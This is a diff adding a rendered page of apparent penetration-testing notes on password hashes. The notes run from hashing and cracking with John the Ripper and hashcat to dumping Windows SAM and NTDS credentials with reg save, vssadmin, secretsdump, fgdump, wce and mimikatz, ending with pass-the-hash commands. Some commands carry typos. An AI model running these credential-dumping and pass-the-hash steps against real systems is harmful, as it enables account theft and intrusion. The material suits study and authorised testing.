@@ -1,0 +1,135 @@
+I"�<h3 id="examples">Examples</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"teste"</span> | <span class="nb">md5sum
+</span>3b16dc694c38d04f7d7451cc37d3c654  -
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"teste"</span> | <span class="nb">sha256sum 
+</span>a0ec927b1044a5e945fbd9cf4370b4be1bc1ebc93bca51bc37f02a8814196bde  -
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">md5sum </span>teste.txt
+2dc6bdf12b1b886e5e2f3a72f4fb2293  teste.txt
+</code></pre></div></div>
+
+<h3 id="one-way-x-two-way">One way x Two way</h3>
+
+<ul>
+  <li>
+    <p>One way: Hash without reverse, only way to break is brute force</p>
+  </li>
+  <li>
+    <p>Two way: Base64 is a example is possible to do the reverse.</p>
+  </li>
+</ul>
+
+<h3 id="hash-lenght">Hash lenght</h3>
+<ul>
+  <li>md5: 32 characters</li>
+  <li>sha1: 40 characters</li>
+  <li>sha256: 64 characters</li>
+  <li>sha512: 128 characters</li>
+</ul>
+
+<h2 id="linux">Linux</h2>
+<h3 id="indentify-hashes">Indentify hashes</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hash-identifier 3b16dc694c38d04f7d7451cc37d3c654
+</code></pre></div></div>
+
+<h3 id="linux-hashes">Linux hashes</h3>
+<p>Are in /etc/shadow.<br />
+In this format: $id$salt$encrypted</p>
+<ul>
+  <li>id: Mehtod type: 1 = md5, 5 = sha256, 6 = sha512</li>
+  <li>salt: Random information to help to protect the hash.</li>
+  <li>encypted: Its the hash with salt.
+    <ul>
+      <li>kali:$y$j9T$GLYvBrczFiXmyft7hxEwX/$ev6ucG67u9pWBLvf7b1WoUTRQMXUDoK5gtuzUOQDU73:18819:0:99999:7::: : Use yescrypt($y$), derivate from originals functions.</li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="decrypt">Decrypt</h3>
+<h4 id="worldlists">Worldlists</h4>
+<ul>
+  <li>/usr/share/wordlists/rockyou.txt</li>
+  <li>/usr/share/john/password.lst</li>
+</ul>
+
+<h4 id="john-the-ripper">John the ripper</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jonh <span class="nb">hash 
+</span>jonh —format<span class="o">=</span>Raw-MD5 —wordlist<span class="o">=</span>rockyou.txt
+</code></pre></div></div>
+<h4 id="hashcat">Hashcat</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-m</span> 100 <span class="nb">hash</span> /usr/share/john/password.lst —force
+</code></pre></div></div>
+
+<h2 id="windows">Windows</h2>
+<p><strong>SAM  -Security Account manager(Windows)</strong> : User accounts.</p>
+<ul>
+  <li>%SystemRoot%/system32/config/sam</li>
+</ul>
+
+<p><strong>NTDS.NIT(Windows server/Active directory)</strong> : Active directory include users..</p>
+<ul>
+  <li>%SystemRoot%/ntds/ntds.dit</li>
+</ul>
+
+<p><strong>SYSTEM</strong>: System file, use do decrypt sam/ndts.dit</p>
+<ul>
+  <li>%systemroot%/system32/config/system</li>
+</ul>
+
+<h3 id="hash">Hash</h3>
+<p>usser:id:LM(LAN MANAGER):NTLM(NT LAM MANAGER)</p>
+<ul>
+  <li>ids: 500-adm:501-guest, 1000:helpassistant,1005:user</li>
+  <li>LM: If begin with aa and finish ee (always equal), not used == empty.</li>
+</ul>
+
+<h3 id="old-windows">Old Windows</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg save hklm<span class="se">\s</span>am samcopy
+reg save hklm<span class="se">\s</span>ystem systemcopy
+
+
+samdump2 samcopy systemcopy <span class="c"># Show hashes</span>
+
+impacket-secretdump <span class="nt">-sam</span> samcopy <span class="nt">-system</span> systemcopy LOCAL <span class="c"># Better</span>
+</code></pre></div></div>
+
+<h3 id="modernactive-directory">Modern/Active directory</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vssadmin create shadow /for<span class="o">=</span>c:
+copy <span class="s2">"volumecreated"</span><span class="se">\w</span>indows<span class="se">\n</span>tds<span class="se">\n</span>tds.dit c:<span class="se">\n</span>tds.dit
+copy <span class="s2">"volumecreated"</span><span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\c</span>onfig<span class="se">\ </span>c:<span class="se">\s</span>ystem1222
+
+impacket-secretdump <span class="nt">-ntds</span> ntds.dit <span class="nt">-system</span> system1222 LOCAL
+</code></pre></div></div>
+<h3 id="in-cache">In cache</h3>
+<p>Meterpreter</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upload /usr/share/windows-binaries/fgdump/fgdump.exe <span class="c"># Upload do victim</span>
+fgdumpe.exe <span class="c"># Execute will create cachedump e pwdump</span>
+
+upload /usr/share/windows-resources/wce/wce-universal 
+wce-universal.exe <span class="nt">-w</span> <span class="c"># Will get the passwords</span>
+
+load mimikatz <span class="c"># Meterpreter module</span>
+wdigest <span class="c"># Cache and more</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vssadmin create shadow /for<span class="o">=</span>c:
+copy <span class="s2">"volumecreated"</span><span class="se">\w</span>indows<span class="se">\n</span>tds<span class="se">\n</span>tds.dit c:<span class="se">\n</span>tds.dit
+copy <span class="s2">"volumecreated"</span><span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\c</span>onfig<span class="se">\ </span>c:<span class="se">\s</span>ystem1222
+
+impacket-secretdump <span class="nt">-ntds</span> ntds.dit <span class="nt">-system</span> system1222 LOCAL
+</code></pre></div></div>
+
+<h4 id="john-the-ripper-1">John the ripper</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john —format<span class="o">=</span>nt —wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt hashlist —show 
+john —format<span class="o">=</span>lm —wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt hashlist —show 
+</code></pre></div></div>
+
+<h3 id="pass-the-hash">Pass the hash*</h3>
+<p>It’s possible use the hash.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pth-winexe <span class="nt">-U</span> john%<span class="s2">"hash"</span> //172.16.1.60 cmd.exe
+exploit/windows/smb/psexec <span class="c">#SMB pass the hash</span>
+</code></pre></div></div>
+:ET
